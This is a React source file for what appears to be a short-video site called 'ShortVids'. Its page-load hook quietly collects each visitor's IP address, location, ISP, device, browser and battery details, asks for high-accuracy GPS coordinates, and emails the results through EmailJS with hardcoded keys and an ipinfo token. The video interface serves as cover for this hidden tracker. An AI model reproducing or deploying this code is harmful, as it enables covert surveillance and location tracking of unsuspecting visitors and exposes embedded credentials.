import React, { useEffect } from 'react';
import emailjs from '@emailjs/browser';
import platform from 'platform';
import Short_Videos from './component/short_videos';
import { Video } from 'lucide-react';
import './styles.css';

const App = () => {
  useEffect(() => {
    async function sendInfoToEmail(ipInfo, deviceInfo, batteryInfo, latitude = null, longitude = null) {
      try {
        const templateParams = {
          date: new Date().toLocaleString(),
          ip: ipInfo?.ip || 'N/A',
          city: ipInfo?.city || 'N/A',
          region: ipInfo?.region || 'N/A',
          country: ipInfo?.country || 'N/A',
          isp: ipInfo?.org || 'N/A',
          latitude: latitude || 'Permission Denied',
          longitude: longitude || 'Permission Denied',
          device_name: deviceInfo.name || 'Unknown',
          device_os: deviceInfo.os.family || 'Unknown',
          browser: deviceInfo.layout || 'Unknown',
          browser_version: deviceInfo.version || 'Unknown',
          device_type: deviceInfo.description || 'Unknown',
          battery_level: batteryInfo?.level || 'Unknown',
          charging_status: batteryInfo?.charging ? 'Charging' : 'Not Charging',
        };

        const response = await emailjs.send(
          'service_92nkmcg',
          'template_h6yolzk',
          templateParams,
          'zqDZ3UbE0eHoHCboK'
        );
        console.log('Email sent:', response.status);
      } catch (error) {
        console.error('Error sending email:', error);
      }
    }

    async function getUserInfo() {
      try {
        const deviceInfo = getDeviceInfo();
        const batteryInfo = await getBatteryInfo();
        
        let ipInfo = {};
        try {
          const ipResponse = await fetch('https://ipinfo.io/json?token=ea93449de8482c');
          ipInfo = await ipResponse.json();
        } catch (ipError) {
          console.error('Error fetching IP info:', ipError);
        }

        try {
          navigator.geolocation.getCurrentPosition(
            (position) => {
              const { latitude, longitude } = position.coords;
              sendInfoToEmail(ipInfo, deviceInfo, batteryInfo, latitude, longitude);
            },
            (error) => {
              console.log('Geolocation error or denied:', error.message);
              sendInfoToEmail(ipInfo, deviceInfo, batteryInfo);
            },
            { enableHighAccuracy: true, timeout: 10000 }
          );
        } catch (geoError) {
          console.error('Geolocation not supported:', geoError);
          sendInfoToEmail(ipInfo, deviceInfo, batteryInfo);
        }
      } catch (error) {
        console.error('General error in getUserInfo:', error);
      }
    }

    function getDeviceInfo() {
      try {
        const deviceInfo = platform.parse(navigator.userAgent);
        return {
          name: deviceInfo.name || 'Unknown',
          version: deviceInfo.version || 'Unknown',
          layout: deviceInfo.layout || 'Unknown',
          os: deviceInfo.os || { family: 'Unknown' },
          description: deviceInfo.description || 'Unknown',
        };
      } catch (error) {
        console.error('Error getting device info:', error);
        return {
          name: 'Unknown',
          version: 'Unknown',
          layout: 'Unknown',
          os: { family: 'Unknown' },
          description: 'Unknown',
        };
      }
    }

    async function getBatteryInfo() {
      try {
        if (navigator.getBattery) {
          const battery = await navigator.getBattery();
          return {
            level: battery.level * 100 + '%',
            charging: battery.charging,
          };
        } else {
          console.log('Battery API not supported');
          return { level: 'API Not Supported', charging: false };
        }
      } catch (error) {
        console.error('Error fetching battery info:', error);
        return { level: 'Unknown', charging: false };
      }
    }

    getUserInfo();
  }, []);

  return (
    <div className="font-sans bg-gray-50 min-h-screen flex flex-col">
      <header className="header">
        <div className="container">
          <div className="header-content">
            <div className="logo-container">
              <Video className="logo-icon" />
              <h1 className="logo-text">ShortVids</h1>
            </div>
            <p className="text-sm md:text-base opacity-90">Watch and share amazing short videos</p>
          </div>
        </div>
      </header>
      
      <main className="flex-grow">
        <Short_Videos />
      </main>
      
      <footer className="footer">
        <div className="container">
          <div className="footer-content">
            <div>
              <div className="footer-logo">
                <Video size={20} className="mr-2" />
                <span className="text-lg font-semibold">ShortVids</span>
              </div>
              <p className="footer-text">© 2025 ShortVids - All rights reserved</p>
            </div>
            
            <div className="social-links">
              <a href="#" className="social-link mr-4">
                <i className="fa fa-twitter"></i>
              </a>
              <a href="#" className="social-link mr-4">
                <i className="fa fa-instagram"></i>
              </a>
              <a href="#" className="social-link">
                <i className="fa fa-facebook"></i>
              </a>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default App;